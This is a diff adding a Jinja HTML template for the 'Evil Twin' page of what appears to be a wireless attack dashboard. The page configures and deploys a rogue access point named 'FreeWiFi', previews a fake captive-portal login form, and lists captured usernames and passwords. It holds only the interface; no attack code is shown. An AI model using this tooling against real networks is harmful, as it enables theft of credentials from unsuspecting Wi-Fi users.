@@ -1,0 +1,139 @@
+{% extends "base.html" %}
+{% block title %}Evil Twin{% endblock %}
+{% block breadcrumb %}Evil Twin{% endblock %}
+
+{% block content %}
+<div class="page-header">
+  <div>
+    <div class="page-title">👻 Evil Twin</div>
+    <div class="page-subtitle">Rogue AP · Captive Portal · Credential Harvester</div>
+  </div>
+  <div style="display:flex;align-items:center;gap:.75rem">
+    <span class="badge badge-{{ module.status }}" data-module="evil_twin">{{ module.status }}</span>
+  </div>
+</div>
+
+<div style="display:grid;grid-template-columns:360px 1fr;gap:1.25rem">
+
+  <!-- Config panel -->
+  <div>
+    <div class="card">
+      <div class="card-header">
+        <div class="card-title">⚙️ AP Configuration</div>
+      </div>
+      <div class="card-body">
+        <div class="form-group">
+          <label class="form-label">SSID (Network Name)</label>
+          <input id="etSsid" class="form-input" value="FreeWiFi" type="text">
+        </div>
+        <div class="form-group">
+          <label class="form-label">Channel</label>
+          <select id="etChannel" class="form-select">
+            {% for ch in [1,2,3,4,5,6,7,8,9,10,11] %}
+            <option value="{{ ch }}" {{ 'selected' if ch==6 }}>Channel {{ ch }}</option>
+            {% endfor %}
+          </select>
+        </div>
+        <div style="display:flex;flex-direction:column;gap:.5rem;margin-top:1rem">
+          <button class="btn btn-red" onclick="moduleAction('evil_twin','start')">
+            👻 Deploy Evil Twin
+          </button>
+          <button class="btn btn-ghost" onclick="moduleAction('evil_twin','stop')">
+            ■ Shutdown AP
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Captive portal preview -->
+    <div class="card" style="margin-top:1.25rem">
+      <div class="card-header">
+        <div class="card-title">🖥 Portal Preview</div>
+      </div>
+      <div class="card-body" style="padding:.75rem">
+        <div style="background:#f0f2f5;border-radius:8px;padding:1.5rem;text-align:center;color:#333">
+          <div style="font-size:2rem;margin-bottom:.5rem">📶</div>
+          <div style="font-size:.9rem;font-weight:700;margin-bottom:.25rem" id="previewSsid">FreeWiFi</div>
+          <div style="font-size:.75rem;color:#666;margin-bottom:1rem">Sign in to get internet access</div>
+          <input type="text" placeholder="Username / Email"
+                 style="width:100%;padding:.5rem;border:1px solid #ddd;border-radius:6px;margin-bottom:.5rem;font-size:.8rem;box-sizing:border-box">
+          <input type="password" placeholder="Password"
+                 style="width:100%;padding:.5rem;border:1px solid #ddd;border-radius:6px;margin-bottom:.75rem;font-size:.8rem;box-sizing:border-box">
+          <div style="background:#0066ff;color:white;padding:.5rem;border-radius:6px;font-size:.8rem;font-weight:600">
+            Connect
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Credentials table -->
+  <div>
+    <div class="card">
+      <div class="card-header">
+        <div class="card-title">🔑 Captured Credentials</div>
+        <div style="display:flex;gap:.5rem;align-items:center">
+          <span style="font-family:var(--font-mono);font-size:.72rem;color:var(--muted)">
+            {{ credentials|length }} captured
+          </span>
+          <button class="btn btn-ghost btn-sm" onclick="loadCredentials()">↻ Refresh</button>
+        </div>
+      </div>
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr>
+              <th>Username</th>
+              <th>Password</th>
+              <th>IP Address</th>
+              <th>Source</th>
+              <th>Timestamp</th>
+            </tr>
+          </thead>
+          <tbody id="credsTableBody">
+            {% for c in credentials %}
+            <tr>
+              <td style="color:var(--red);font-weight:600">{{ c.username }}</td>
+              <td style="color:var(--orange)">{{ c.password }}</td>
+              <td style="color:var(--muted)">{{ c.ip_address }}</td>
+              <td style="color:var(--muted)">{{ c.source }}</td>
+              <td style="color:var(--muted)">{{ c.timestamp[:19] if c.timestamp else '-' }}</td>
+            </tr>
+            {% else %}
+            <tr>
+              <td colspan="5" style="text-align:center;color:var(--muted);padding:3rem;font-family:var(--font-mono)">
+                No credentials captured yet
+              </td>
+            </tr>
+            {% endfor %}
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- Live event feed -->
+    <div class="card" style="margin-top:1.25rem">
+      <div class="card-header">
+        <div class="card-title">⚡ Live Events</div>
+      </div>
+      <div class="card-body" style="padding:.75rem">
+        <div class="event-feed" id="eventFeed" style="max-height:300px"></div>
+      </div>
+    </div>
+  </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+document.getElementById('etSsid').addEventListener('input', e => {
+  document.getElementById('previewSsid').textContent = e.target.value || 'FreeWiFi';
+});
+document.addEventListener('DOMContentLoaded', () => {
+  setInterval(loadCredentials, 10000);
+  fetch('/api/evil-twin/events').then(r=>r.json()).then(evs => {
+    evs.forEach(e => prependEvent(e));
+  });
+});
+</script>
+{% endblock %}
